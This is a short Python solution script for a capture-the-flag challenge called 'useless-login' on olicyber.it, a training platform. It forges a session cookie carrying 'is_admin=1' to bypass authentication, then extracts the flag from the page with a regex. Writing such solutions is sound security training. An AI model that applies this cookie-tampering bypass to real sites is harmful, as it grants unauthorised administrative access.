import requests
import re
import random, string

def randomword(length):
   letters = string.ascii_lowercase
   return ''.join(random.choice(letters) for i in range(length))


URL = "https://useless-login.challs.olicyber.it"

out = requests.get(URL+"/home", cookies={"session": "username=xxcdcdc&is_admin=1"})

flag = re.findall(r"flag\{[^}]*\}", out.text)[0]
print(flag)
